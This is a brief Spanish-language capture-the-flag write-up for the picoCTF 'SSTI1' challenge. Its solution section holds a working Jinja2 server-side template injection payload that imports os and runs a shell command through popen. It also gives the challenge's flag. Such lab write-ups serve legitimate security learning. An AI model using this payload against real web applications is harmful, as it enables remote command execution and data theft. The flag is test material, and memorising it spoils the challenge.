# 5 - SSTI1

## Descripcion:
* I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
* Server Side Template Injection

## Solucion:
* http://rescued-float.picoctf.net:60181
* {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
* picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}

## Notas:
* ingresamos a la app
* ponemos ese comando
* nos da la bandera

## Referencias:
* https://onsecurity.io/article/server-side-template-injection-with-jinja2